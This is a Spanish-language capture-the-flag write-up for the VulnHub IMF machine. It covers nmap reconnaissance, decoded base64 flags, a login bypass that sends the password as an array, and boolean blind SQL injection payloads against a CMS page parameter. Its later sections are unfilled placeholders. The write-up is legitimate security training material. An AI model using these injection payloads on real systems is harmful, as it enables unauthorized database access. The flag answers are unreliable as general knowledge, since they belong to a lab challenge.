---
title: Plataforma VulnHub IMF
date: 2025-10-14
tags: [writeup, vulnhub, web-application-attack, sql-injection, ssh, privilege-escalation]
references:
  - https://www.vulnhub.com/entry/imf-1,162/
---

!cover.png

!INFO Informacion General

Este documento contiene un writeup detallado de cómo comprometer la máquina IMF en VulnHub. Se abordan técnicas de enumeración GIT, inyección SQL y escalada de privilegios mediante abuso de servicios locales.

---

TITLE Plataforma VulnHub IMF

---

TITLE Objetivo Principal

- Rootear la máquina virtual IMF.

---

TITLE Herramientas Utilizadas

| Herramienta | Función principal                      |
|-------------|--------------------------------------|
| arp-scan    | Descubrimiento de hosts               |
| nmap        | Escaneo de puertos y servicios       |
| tcping      | Verificación de conexiones TCP       |
| Burp Suite  | Interceptación y modificación HTTP   |
| VW Ware     | Plataforma de virtualización          |

---

!TIP Preparativos Personales

La máquina vulnerable fue ejecutada sobre VMware Workstation en Arch Linux. Las herramientas fueron instaladas desde repositorios oficiales o compiladas con proxy según necesidad.

---

TITLE Fase de Reconocimiento

Uso de arp-scan para descubrir IP:

arp-scan -I vmnet1 --localnet

IP descubierta: 172.16.23.129

Ping sin respuesta, se usó tcping para verificar conectividad, realizó compilación manual desde github.com/cloverstd/tcping.

Escaneo básico de puertos con nmap:

sudo nmap -p- --open -sS -T4 -vvv -n -Pn 172.16.23.129 -oG allports

Puerto abierto: 80

Escaneo detallado:

nmap -p80 -sCV 172.16.23.129 -oN targeted

Servicio detectado: Apache httpd 2.4.18 Ubuntu

---

TITLE Enumeración Web y Datos Encontrados

Se halló cadena en base64 en la página web:

ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==

Decodificada da:

flag2{aW1mYWRtaW5pc3RyYXRvcg==}

Texto interno decodificado: imfadministrator

En comentarios de la página se encontró otra flag en base64:

flag1{YWxsdGhlZmlsZXM=}

Resultado: allthefiles

Además, se identificaron posibles usuarios visibles en la interfaz.

---

TITLE Acceso a /imfadministrator

Formulario login:

<form method="POST" action="">
  <label>Username:</label><input type="text" name="user" value=""><br />
  <label>Password:</label><input type="password" name="pass" value=""><br />
  <input type="submit" value="Login">
</form>

Comentario indica contraseña "harcoded" (hard-coded).

---

TITLE Enumeración y Ataques SQL

Los usuarios existen en la base de datos, se interceptaron peticiones con Burp Suite. Modificación del campo password como array devolvió respuesta TRUE y tercera flag:

flag3{continueTOcms}

En el CMS se probó inyección SQL de tipo booleano con resultado:

GET /imfadministrator/cms.php?pagename=home'  -> error SQL mostrando directorio

Pruebas booleanas para determinar true/false:

GET /imfadministrator/cms.php?pagename=home'+and+'1'='1  -> TRUE (pantalla bienvenida)

GET /imfadministrator/cms.php?pagename=home'+and+'1'='2  -> FALSE (pantalla vacía)

---

TITLE Extracción de Información de Base de Datos

Confirmación del nombre de la base: mysql

Ejemplo payload para extracción de datos:

GET /imfadministrator/cms.php?pagename=home'+and+(select+schema_name+from+information_schema.schemata+limit+0,1)='mysql

Enumeración caracter por caracter para bases de datos restantes, por ejemplo:

GET /imfadministrator/cms.php?pagename=home'+and+(select+substring(schema_name,1,1)+from+information_schema.schemata+limit+2,1)='m

Respuesta TRUE.

---

TITLE Escalada de Privilegios

[Por completar con detalles de escalada de privilegios encontrados]

---

TITLE Conclusiones

[Por completar con resumen y aprendizajes clave]

---

!TIP Buenas Prácticas

[Por completar con recomendaciones]

---

!WARNING

Este documento es solo para fines educativos y legales. Se prohíbe su uso para actividades no autorizadas.

